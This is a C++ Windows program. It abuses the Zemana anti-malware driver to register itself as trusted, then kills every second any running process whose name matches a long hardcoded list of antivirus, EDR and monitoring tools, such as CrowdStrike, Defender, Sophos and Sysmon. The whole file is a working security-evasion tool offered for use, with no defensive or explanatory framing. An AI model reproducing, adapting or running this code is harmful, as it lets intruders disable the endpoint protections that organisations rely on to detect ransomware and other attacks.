#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <process.h>
#include <tlhelp32.h> 
#include <codecvt>
#include <locale>


// Define constants
const DWORD IOCTL_REGISTER_PROCESS = 0x80002010;
const DWORD IOCTL_TERMINATE_PROCESS = 0x80002048;

// Define error codes
const DWORD errnoERROR_IO_PENDING = 997;
const DWORD ERROR_EINVAL = 0x6;

// Define function to convert string to lowercase
std::string toLower(const std::string& str) {
    std::string result = str;
    for (char& c : result) {
        c = tolower(c);
    }
    return result;
}

std::string wideToNarrow(const wchar_t* wide) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter;
    return converter.to_bytes(wide);
}

// Define function to check if a process is an EDR/AV process
bool isEdrAvProcess(const std::string& processName) {
    std::vector<std::string> edrAvProcesses = {
        "activeconsole", "anti malware", "anti-malware", "antimalware", "anti virus", "anti-virus", "antivirus",
        "appsense", "authtap", "avast", "avecto", "canary", "carbonblack", "carbon black", "cb.exe",
        "ciscoamp", "cisco amp", "countercept", "countertack", "cramtray", "crssvc",
        "crowdstrike", "csagent", "csfalcon", "csshell", "cybereason", "cyclorama",
        "cylance", "cyoptics", "cyupdate", "cyvera", "cyserver", "cytray",
        "darktrace", "defendpoint", "defender", "eectrl", "elastic", "endgame",
        "f-secure", "forcepoint", "fireeye", "groundling", "GRRservic", "inspector",
        "ivanti", "kaspersky", "lacuna", "logrhythm", "malware", "mandiant",
        "mcafee", "morphisec", "msascuil", "msmpeng", "nissrv", "omni",
        "omniagent", "osquery", "palo alto networks", "pgeposervice", "pgsystemtray", "privilegeguard",
        "procwall", "protectorservic", "qradar", "redcloak", "secureworks", "securityhealthservice",
        "semlaunchsv", "sentinel", "sepliveupdat", "sisidsservice", "sisipsservice", "sisipsutil",
        "smc.exe", "smcgui", "snac64", "sophos", "splunk", "srtsp",
        "servicehost.exe", "mcshield.exe", "mcupdatemgr.exe", "QcShm.exe", "ModuleCoreService.exe", "PEFService.exe", "McAWFwk.exe", "mfemms.exe", "mfevtps.exe", "McCSPServiceHost.exe", "Launch.exe", "delegate.exe", "McDiReg.exe", "McPvTray.exe", "McInstruTrack.exe", "McUICnt.exe", "ProtectedModuleHost.exe", "MMSSHOST.exe", "MfeAVSvc.exe",
        "symantec", "symcorpu", "symefasi",
        "sysinternal", "sysmon", "tanium",
        "tda.exe", "tdawork", "tpython",
        "mcapexe.exe",
        "vectra", "wincollect", "windowssensor",
        "wireshark", "threat", "xagt.exe",
        "xagtnotif.exe", "mssense", "efwd.exe", "ekrn.exe"
    };

    for (const auto& edrAvProcess : edrAvProcesses) {
        if (processName.find(edrAvProcess) != std::string::npos) {
            return true;
        }
    }
    return false;
}

// Define function to terminate an EDR/AV process
bool terminateEdrAvProcess(HANDLE hDevice, DWORD procId) {
    DWORD bytesRet = 0;
    DWORD dummy = 0;
    DWORD err = DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, reinterpret_cast<LPVOID>(&procId), sizeof(DWORD), 0, 0, &bytesRet, 0);
    if (err == 0) {  
        std::cout << "Failed to terminate process " << procId << std::endl;
        return false;
    }
    return true;  
}

int checkEdrAvProcesses(HANDLE hDevice) {
    DWORD count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to create process snapshot" << std::endl;
        return -1;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnap, &pe)) {
        std::cout << "Failed to enumerate processes" << std::endl;
        CloseHandle(hSnap);
        return -1;
    }
    do {
        std::string processName = wideToNarrow(pe.szExeFile);
        if (isEdrAvProcess(toLower(processName))) {
            DWORD procId = pe.th32ProcessID;
            if (!terminateEdrAvProcess(hDevice, procId)) {
                std::cout << "Failed to terminate process " << procId << std::endl;
                CloseHandle(hSnap);
                return -1;
            }
            count++;
        }
    } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);
    return count;
}

int main() {
    HANDLE hDevice = CreateFile(L"\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "Failed to open handle to driver" << std::endl;
        return -1;
    }
    DWORD input = GetCurrentProcessId();
    DWORD dummy = 0;
    if (!DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, reinterpret_cast<LPVOID>(&input), sizeof(DWORD), 0, 0, &dummy, 0)) {
        std::cout << "Failed to register process in trusted list" << std::endl;
        CloseHandle(hDevice);
        return -1;
    }
    std::cout << "Process registered in trusted list" << std::endl;
    std::cout << "Terminating ALL EDR/XDR/AVs..." << std::endl;

    while (true) {
        int count = checkEdrAvProcesses(hDevice);
        if (count == -1) {
            std::cout << "Error occurred while checking processes" << std::endl;
            break;
        }
        else if (count == 0) {
            std::cout << "No EDR/XDR/AV processes found" << std::endl;
        }
        else {
            std::cout << "Terminated " << count << " EDR/XDR/AV processes" << std::endl;
        }
        Sleep(1000);
    }

    CloseHandle(hDevice);
    return 0;
}